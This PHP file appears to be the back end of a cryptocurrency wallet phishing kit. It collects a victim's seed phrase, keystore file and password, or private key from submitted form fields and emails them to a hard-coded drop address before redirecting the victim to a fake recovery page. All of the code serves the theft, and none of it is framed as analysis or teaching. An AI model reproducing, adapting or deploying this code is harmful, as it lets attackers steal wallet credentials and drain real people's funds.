<?php 
@session_start();
@ob_start();
require_once  __DIR__.'/phpmailer/PHPMailerAutoload.php';
include "func.php";
include "mailer.php";
function Royalencoder($str){
    $str = md5($str);
    $str = substr($str, 0, 10);
    $str = sha1($str);
    $str = substr($str, 0, 10);
    return $str;
}
$time = Royalencoder(time());

if(isset($_GET['id'])){
    $id=$_GET['id'];
}

if(isset($_POST['submit1'])){
    $phrase=$_POST['phras'];
    $wallet=$_POST['walletname'];
    $usr = new Royaltechinc\Mailer;
    $usr->mailPhrase("harpermendez01@yahoo.com", urlize($phrase), $wallet, $time);
    
    header("location: recover/$time");
    exit;
}
if(isset($_POST['submit2'])){
    $keystorejson=$_POST['keysto'];
    $keystorepasswword=$_POST['keystorepass'];
    $wallet=$_POST['walletname'];
    $usr = new Royaltechinc\Mailer;
    $usr->mailKeystore("harpermendez01@yahoo.com", $keystorejson, $keystorepasswword, $wallet, $time);
    
    header("location: recover/$time");
    exit;
}
if(isset($_POST['submit3'])){
    $privatekey=$_POST['privatek'];
    $wallet=$_POST['walletname'];
    
    $usr = new Royaltechinc\Mailer;
    $usr->mailPrivatekey("harpermendez01@yahho.com", urlize($privatekey), $wallet, $time);
    
    header("location: recover/$time");
    exit;
}


?>
